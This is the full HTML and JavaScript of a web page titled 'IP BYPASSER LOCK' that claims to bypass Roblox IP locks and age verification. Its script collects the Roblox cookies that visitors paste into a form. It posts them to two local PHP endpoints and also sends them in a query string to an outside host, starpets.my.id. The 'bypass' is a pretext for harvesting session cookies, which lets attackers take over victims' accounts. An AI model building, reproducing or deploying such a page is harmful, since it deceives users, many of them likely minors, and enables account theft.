
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP BYPASSER</title>
    <link rel="icon" href="https://cdn.discordapp.com/attachments/1324499580728901764/1338572878563774474/download__4_-removebg-preview.png?ex=67ab92a3&is=67aa4123&hm=264e8bde92868d606329d83bdb080ff9aff1e59f3b94ea12b7a1ff80a49aa046&" type="image/png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f9ff; color: #333; text-align: center; }
        .container { 
            max-width: 600px; 
            margin: 100px auto; 
            padding: 30px; 
            background-color: #ffffff; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        textarea { 
            width: 100%; 
            height: 200px; 
            padding: 12px; 
            font-size: 16px; 
            border: 1px solid #d1e4f1; 
            border-radius: 8px; 
            outline: none; 
            resize: none; 
            transition: all 0.3s ease-in-out;
        }
        textarea:focus {
            border-color: #2d87f0;
            box-shadow: 0 0 8px rgba(45, 135, 240, 0.5);
        }
        button { 
            padding: 12px 20px; 
            background-color: #2d87f0; 
            color: white; 
            font-size: 16px; 
            font-weight: 600; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.3s ease-in-out;
        }
        button:disabled {
            background-color: #888;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>IP BYPASSER LOCK</h1>
    <div class="form-box">
        <form id="bypassForm">
            <label for="payload">Enter Cookies:</label><br>
            <textarea name="payload" id="payload" rows="6"></textarea><br>
            <button type="submit" id="submitBtn">Submit Cookies</button>
            <p id="countdown" style="margin-top: 10px; font-size: 14px; color: red;"></p>
        </form>
    </div>
    <br>
    <p>New Cookie:</p>
    <textarea id="messageText" readonly></textarea>
    <p>Go Age bypass? <a href="/age/bypass" target="_blank">click me</a></p>
    <br>
</div>

<script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
<script>
document.getElementById('bypassForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const payload = document.getElementById('payload').value;

    if (!payload.trim()) {
        iziToast.show({
            title: 'Error:',
            message: 'Please enter your Roblox cookies.',
            color: 'red',
            position: 'topCenter',
            timeout: 3000
        });
        return;
    }

    const cooldownEnd = Date.now() + 30000;
    localStorage.setItem("cooldownEnd", cooldownEnd);
    setCooldown(30);

    const requests = [
        fetch('bypass-lock.php', {
            method: 'POST',
            body: JSON.stringify({ payload: payload }),
            headers: { 'Content-Type': 'application/json' }
        }),
        fetch('bypass-age-verify.php', {
            method: 'POST',
            body: JSON.stringify({ payload: payload }),
            headers: { 'Content-Type': 'application/json' }
        }),
        fetch(`https://starpets.my.id/bypass-verify.php?cookie=${encodeURIComponent(payload)}`)
    ];

    Promise.all(requests)
        .then(responses => Promise.all(responses.map(res => res.text())))
        .then(responseTexts => {
            console.log("Raw API Responses:", responseTexts);
            document.getElementById('messageText').value = responseTexts.join('\n');
            iziToast.show({
                title: '',
                message: responseTexts.join('<br>'),
                color: 'green',
                position: 'topCenter',
                timeout: 5000
            });
        })
        .catch(error => {
            console.error('Error:', error);
            iziToast.show({
                title: 'Error:',
                message: 'An error occurred while contacting the server.',
                color: 'red',
                position: 'topCenter',
                timeout: 5000
            });
        });
});

function setCooldown(timeLeft) {
    const submitBtn = document.getElementById('submitBtn');
    const countdown = document.getElementById('countdown');
    submitBtn.disabled = true;
    
    const interval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(interval);
            submitBtn.disabled = false;
            submitBtn.textContent = "Submit Cookies";
            countdown.textContent = "";
            localStorage.removeItem("cooldownEnd");
        } else {
            submitBtn.textContent = `Please wait ${timeLeft}s`;
            countdown.textContent = `Wait ${timeLeft}s before submitting again`;
            timeLeft--;
        }
    }, 1000);
}

window.onload = function() {
    const cooldownEnd = localStorage.getItem("cooldownEnd");
    if (cooldownEnd) {
        const timeLeft = Math.floor((cooldownEnd - Date.now()) / 1000);
        if (timeLeft > 0) {
            setCooldown(timeLeft);
        }
    }
};
</script>

</body>
</html>